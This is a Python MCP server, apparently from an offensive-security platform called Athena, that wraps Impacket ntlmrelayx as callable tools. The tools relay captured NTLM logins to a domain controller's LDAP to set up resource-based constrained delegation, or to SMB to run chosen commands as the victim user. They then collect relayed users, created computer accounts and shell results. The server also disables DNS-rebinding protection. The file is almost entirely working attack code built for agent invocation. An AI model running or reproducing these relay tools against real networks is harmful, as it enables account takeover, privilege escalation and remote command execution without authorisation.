"""ntlm-relay MCP Server for Athena.

NTLM Relay attacks using Impacket ntlmrelayx:
Relay to LDAP (delegate access), relay to SMB (command exec),
collect results, and stop relay sessions.
Uses start/collect/stop three-phase model for the long-running listener.
Returns JSON with {"facts": [{"trait": ..., "value": ...}]}
to integrate with Athena's fact collection pipeline.
"""

import asyncio
import json
import os
import re
import signal

from mcp.server.fastmcp import FastMCP
from mcp.server.transport_security import TransportSecuritySettings

_security = TransportSecuritySettings(
    enable_dns_rebinding_protection=False,
)

mcp = FastMCP("athena-ntlm-relay", transport_security=_security)

_active_sessions: dict[str, dict] = {}  # session_id -> {pid, proc, log_path, ...}

RELAY_LOG_DIR = "/tmp/ntlmrelay-logs"


async def _run_command(cmd: list[str], timeout: int = 120) -> tuple[str, str, int]:
    """Run subprocess asynchronously with timeout."""
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return "", "Command timed out", -1
    return (
        stdout.decode(errors="replace"),
        stderr.decode(errors="replace"),
        proc.returncode or 0,
    )


@mcp.tool()
async def ntlm_relay_to_ldap(
    target_dc: str,
    listener_iface: str = "0.0.0.0",
    delegate_access: bool = True,
    timeout: int = 120,
) -> str:
    """Start NTLM relay to LDAP for RBCD delegation abuse.

    Relays captured NTLM authentication to LDAP on the DC to configure
    resource-based constrained delegation (RBCD).

    Args:
        target_dc: Domain Controller IP or hostname
        listener_iface: Interface to listen on (default: 0.0.0.0)
        delegate_access: If True, use --delegate-access for RBCD
        timeout: Maximum runtime in seconds before auto-stop

    Returns:
        JSON with facts: ad.relay_session
    """
    facts: list[dict[str, str]] = []

    try:
        os.makedirs(RELAY_LOG_DIR, exist_ok=True)

        cmd = [
            "impacket-ntlmrelayx",
            "-t", f"ldap://{target_dc}",
            "-smb2support",
        ]
        if delegate_access:
            cmd.append("--delegate-access")

        log_path = os.path.join(RELAY_LOG_DIR, f"ldap-relay-{target_dc}.log")

        log_file = open(log_path, "w")
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=log_file,
            stderr=asyncio.subprocess.STDOUT,
        )

        session_id = f"relay-ldap-{proc.pid}"
        _active_sessions[session_id] = {
            "pid": proc.pid,
            "proc": proc,
            "log_path": log_path,
            "log_file": log_file,
            "target": target_dc,
            "type": "ldap",
        }

        # Check if process started successfully
        try:
            await asyncio.wait_for(proc.wait(), timeout=3)
            log_file.close()
            content = ""
            if os.path.exists(log_path):
                with open(log_path) as f:
                    content = f.read()
            _active_sessions.pop(session_id, None)
            return json.dumps({
                "facts": [],
                "raw_output": content[:4000],
                "error": {"type": "StartupError", "message": "ntlmrelayx exited immediately"},
            })
        except asyncio.TimeoutError:
            pass  # Good - process is still running

        facts.append({
            "trait": "ad.relay_session",
            "value": json.dumps({
                "session_id": session_id,
                "pid": proc.pid,
                "target": f"ldap://{target_dc}",
                "delegate_access": delegate_access,
                "log_path": log_path,
                "status": "running",
            }),
        })

        async def _auto_stop() -> None:
            await asyncio.sleep(timeout)
            try:
                os.kill(proc.pid, signal.SIGTERM)
                log_file.close()
                _active_sessions.pop(session_id, None)
            except OSError:
                pass

        asyncio.create_task(_auto_stop())

        return json.dumps({
            "facts": facts,
            "raw_output": f"NTLM relay to ldap://{target_dc} started (PID: {proc.pid})",
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def ntlm_relay_to_smb(
    target: str,
    listener_iface: str = "0.0.0.0",
    command: str = "whoami",
    timeout: int = 120,
) -> str:
    """Start NTLM relay to SMB for command execution.

    Relays captured NTLM authentication to SMB on target to execute
    commands as the relayed user.

    Args:
        target: Target IP or hostname for SMB relay
        listener_iface: Interface to listen on (default: 0.0.0.0)
        command: Command to execute on successful relay
        timeout: Maximum runtime in seconds before auto-stop

    Returns:
        JSON with facts: ad.relay_session
    """
    facts: list[dict[str, str]] = []

    try:
        os.makedirs(RELAY_LOG_DIR, exist_ok=True)

        cmd = [
            "impacket-ntlmrelayx",
            "-t", f"smb://{target}",
            "-smb2support",
            "-c", command,
        ]

        log_path = os.path.join(RELAY_LOG_DIR, f"smb-relay-{target}.log")

        log_file = open(log_path, "w")
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=log_file,
            stderr=asyncio.subprocess.STDOUT,
        )

        session_id = f"relay-smb-{proc.pid}"
        _active_sessions[session_id] = {
            "pid": proc.pid,
            "proc": proc,
            "log_path": log_path,
            "log_file": log_file,
            "target": target,
            "type": "smb",
            "command": command,
        }

        # Check startup
        try:
            await asyncio.wait_for(proc.wait(), timeout=3)
            log_file.close()
            content = ""
            if os.path.exists(log_path):
                with open(log_path) as f:
                    content = f.read()
            _active_sessions.pop(session_id, None)
            return json.dumps({
                "facts": [],
                "raw_output": content[:4000],
                "error": {"type": "StartupError", "message": "ntlmrelayx exited immediately"},
            })
        except asyncio.TimeoutError:
            pass

        facts.append({
            "trait": "ad.relay_session",
            "value": json.dumps({
                "session_id": session_id,
                "pid": proc.pid,
                "target": f"smb://{target}",
                "command": command,
                "log_path": log_path,
                "status": "running",
            }),
        })

        async def _auto_stop() -> None:
            await asyncio.sleep(timeout)
            try:
                os.kill(proc.pid, signal.SIGTERM)
                log_file.close()
                _active_sessions.pop(session_id, None)
            except OSError:
                pass

        asyncio.create_task(_auto_stop())

        return json.dumps({
            "facts": facts,
            "raw_output": f"NTLM relay to smb://{target} started (PID: {proc.pid})",
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def ntlm_relay_collect(
    session_id: str = "",
) -> str:
    """Collect results from active NTLM relay sessions.

    Args:
        session_id: Optional session ID (if empty, collects from all)

    Returns:
        JSON with facts: ad.relay_result, ad.relay_delegated, credential.shell
    """
    facts: list[dict[str, str]] = []

    try:
        sessions_to_check = {}
        if session_id and session_id in _active_sessions:
            sessions_to_check = {session_id: _active_sessions[session_id]}
        else:
            sessions_to_check = dict(_active_sessions)

        raw_lines: list[str] = []

        for sid, info in sessions_to_check.items():
            log_path = info.get("log_path", "")
            if not log_path or not os.path.exists(log_path):
                continue

            with open(log_path) as f:
                content = f.read()
            raw_lines.append(f"=== {sid} ===")
            raw_lines.append(content[:2000])

            # Parse delegation results (RBCD)
            if "RBCD" in content or "delegate" in content.lower():
                delegate_re = re.compile(
                    r"creating computer account.*?(\S+)\$",
                    re.IGNORECASE,
                )
                for match in delegate_re.finditer(content):
                    facts.append({
                        "trait": "ad.relay_delegated",
                        "value": json.dumps({
                            "session": sid,
                            "computer_account": match.group(1),
                            "type": "RBCD",
                        }),
                    })

            # Parse command execution results
            if info.get("type") == "smb":
                exec_re = re.compile(r"Executed.*?on.*?(\S+)", re.IGNORECASE)
                for match in exec_re.finditer(content):
                    facts.append({
                        "trait": "credential.shell",
                        "value": json.dumps({
                            "session": sid,
                            "target": match.group(1),
                            "command": info.get("command", ""),
                        }),
                    })

            # Parse any authentication relays
            auth_re = re.compile(
                r"authenticat.*?(\S+\\?\S+).*?against.*?(\S+)",
                re.IGNORECASE,
            )
            for match in auth_re.finditer(content):
                facts.append({
                    "trait": "ad.relay_result",
                    "value": json.dumps({
                        "session": sid,
                        "user": match.group(1),
                        "target": match.group(2),
                    }),
                })

        return json.dumps({
            "facts": facts,
            "raw_output": "\n".join(raw_lines)[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def ntlm_relay_stop(
    session_id: str = "",
) -> str:
    """Stop NTLM relay sessions.

    Args:
        session_id: Session ID to stop (if empty, stops all)

    Returns:
        JSON with stopped session info
    """
    facts: list[dict[str, str]] = []

    try:
        stopped: list[str] = []

        if session_id and session_id in _active_sessions:
            info = _active_sessions.pop(session_id)
            try:
                os.kill(info["pid"], signal.SIGTERM)
                if "log_file" in info:
                    info["log_file"].close()
                stopped.append(session_id)
            except OSError:
                pass
        elif not session_id:
            for sid, info in list(_active_sessions.items()):
                try:
                    os.kill(info["pid"], signal.SIGTERM)
                    if "log_file" in info:
                        info["log_file"].close()
                    stopped.append(sid)
                except OSError:
                    pass
            _active_sessions.clear()
        else:
            # Try to find and kill ntlmrelayx processes
            stdout, _, _ = await _run_command(["pgrep", "-f", "ntlmrelayx"])
            for pid_str in stdout.strip().splitlines():
                try:
                    os.kill(int(pid_str.strip()), signal.SIGTERM)
                    stopped.append(f"pid-{pid_str.strip()}")
                except (OSError, ValueError):
                    pass

        facts.append({
            "trait": "ad.relay_stopped",
            "value": json.dumps({
                "stopped_sessions": stopped,
                "remaining_sessions": list(_active_sessions.keys()),
            }),
        })

        return json.dumps({
            "facts": facts,
            "raw_output": f"Stopped {len(stopped)} relay session(s)",
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--transport",
        default="stdio",
        choices=["stdio", "sse", "streamable-http"],
    )
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    mcp.settings.host = args.host
    mcp.settings.port = args.port
    mcp.run(transport=args.transport)
